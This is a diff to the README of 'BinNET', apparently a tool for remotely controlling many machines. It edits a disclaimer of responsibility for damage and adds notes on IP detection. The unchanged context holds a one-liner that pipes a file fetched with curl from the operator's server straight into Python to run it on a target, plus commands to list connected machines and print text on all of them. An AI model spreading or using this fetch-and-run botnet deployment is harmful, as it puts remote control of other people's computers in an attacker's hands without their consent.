@@ -1,4 +1,4 @@
-# I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TOOL.
+# DISCLAIMER: I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TOOL.
 
 # BinNET
 
@@ -36,6 +36,9 @@ GNU/Linux:
 curl -s -X GET http(s)://yourip/yourfile | python
 ```
 This reads the file from your server and runs it with Python. It can also run in Windows if the machine has curl installed.
+
+If you are connected to an intranet in the 192.168.1.0/24 range, it will return your private IP. Else, it will return your public IP. I'm currently working on making it work with all private IPs.
+
 ## Available commands(i'll update them)
 ```
 list: lists all machines connected.
@@ -47,3 +50,5 @@ print [text]: prints a text in all connected machines.
 
 help: shows this help message, but inside the program.
 ```
+
+PD: the code is not commented, I'm very lazy.
